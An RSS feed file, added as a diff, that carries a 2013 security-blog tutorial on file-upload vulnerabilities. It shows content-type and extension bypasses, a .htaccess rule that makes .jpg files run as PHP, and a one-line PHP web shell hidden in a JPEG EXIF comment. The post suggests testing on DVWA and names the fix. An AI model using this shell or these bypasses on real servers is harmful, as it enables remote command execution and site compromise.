@@ -1,0 +1,68 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>file upload &#8211; Phocean.net</title>
+	<atom:link href="/blog-archive/tag/file-upload/feed" rel="self" type="application/rss+xml" />
+	<link>/blog-archive</link>
+	<description>Computer Security Blog</description>
+	<lastBuildDate>Fri, 24 Feb 2017 21:17:51 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.9.10</generator>
+	<item>
+		<title>File upload vulnerabilities : appending PHP code to an image</title>
+		<link>/blog-archive/2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html</link>
+		<comments>/blog-archive/2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html#comments</comments>
+		<pubDate>Sun, 29 Sep 2013 21:03:05 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Pentesting]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[file upload]]></category>
+		<category><![CDATA[pentest]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Vulnerability]]></category>
+		<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=1666</guid>
+		<description><![CDATA[Several ways may be used to protect a file upload functionality on a website. A first method is content-type checking, which can be easily bypassed with a intercepting proxy (tampering the MIME type). The screenshot below shows an intercepted request where the attacker modifies the content-type (beforehand text/php) and then forwards the content to the...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>Several ways may be used to protect a file upload functionality on a website.</p>
+<p>A first method is <strong>content-type </strong>checking, which can be easily bypassed with a intercepting proxy (tampering the MIME type). The screenshot below shows an intercepted request where the attacker modifies the content-type (beforehand <code>text/php</code>) and then forwards the content to the server:</p>
+<div id="attachment_1667" style="width: 590px" class="wp-caption aligncenter"><img class="size-medium wp-image-1667" alt="HTTP POST content-type tampering" src="/blog-archive/wp-content/uploads/2013/09/CapturFiles_13-580x313.png" width="580" height="313" srcset="/blog-archive/wp-content/uploads/2013/09/CapturFiles_13-580x313.png 580w, /blog-archive/wp-content/uploads/2013/09/CapturFiles_13-624x337.png 624w, /blog-archive/wp-content/uploads/2013/09/CapturFiles_13.png 902w" sizes="(max-width: 580px) 100vw, 580px" /><p class="wp-caption-text">HTTP POST content-type tampering</p></div>
+<p>Thus, the content-type filtering is bypassed.</p>
+<p>Another method consists in checking the file name <strong>extension</strong>. If simple bypasses like playing with lowercase (<code>.PHP</code> instead of <code>.php</code>), using multiple extension (<code>.php.foo</code>) or triggering the NULL byte (<code>.php%00.jpg</code>) do not work, there is a last chance by uploading a crafted image.</p>
+<p>JPEG files are convenient for code injection: they support EXIF metadata, which include a <em>comment</em> field where anything can be written, as long as it is on a single line.</p>
+<p>So, when a web server parses the image content, it may interpret the PHP code inside if it is improperly secured.</p>
+<p>The method is however totally dependent on the ability to upload a <code>.htaccess</code> file, which may be a long way to go.</p>
+<p>Though, one advantage of using an image in most upload vulnerability exploitation cases is stealth: an image will always look less suspicious than a dropped <code>.php</code> file.</p>
+<p>Anyway, for fun, here is how to do:</p>
+<ol class="split start">
+<li>Upload a <code>.htaccess</code> file that contains:
+<pre>AddType application/x-httpd-php .jpg</pre>
+</li>
+<li>Take a JPEG file of your choice, install the <a title="Jhead" href="http://www.sentex.net/~mwandel/jhead/">jhead</a> tool (there are many alternatives, like <a title="exiftool" href="http://www.sno.phy.queensu.ca/~phil/exiftool/">exiftool</a>, but this one is straightforward).</li>
+<li>House-keeping (delete extra headers):
+<pre>jhead -purejpg &lt;filename&gt;.jpg</pre>
+</li>
+<li>Edit EXIF JPEG comment:
+<pre>jhead -ce &lt;filename&gt;.jpg</pre>
+</li>
+<li>Copy / paste your PHP code, like this one for instance (must fit in one line):
+<pre>&lt;style&gt;body{font-size: 0;}h1{font-size: 12px}&lt;/style&gt;&lt;h1&gt;&lt;?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo '&lt;img src="./clean_imagejs';}__halt_compiler();?&gt;&lt;/h1&gt;</pre>
+<p>This code just reads a command from the cmd parameter when it is set. If it is absent, then for more discretion it displays another image (clean_image.jpg, that you would have uploaded previously, for instance). The CSS style trick (font size of 0) just hides some garbage that comes from the JPEG header.</li>
+<li>Just upload the file and test it! <a title="DVWA" href="http://www.dvwa.co.uk">DVWA</a> is a convenient and safe way for that.</li>
+</ol>
+<p>Note this <a title="php image upload security how not to do it" href="http://nullcandy.com/php-image-upload-security-how-not-to-do-it/">nice article</a> as a reference on the topic, and the solution that is suggested to fix such a vulnerability: disabling one way or another script execution on the upload directory and use random server-side file renaming.</p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html/feed</wfw:commentRss>
+		<slash:comments>6</slash:comments>
+		</item>
+	</channel>
+</rss>
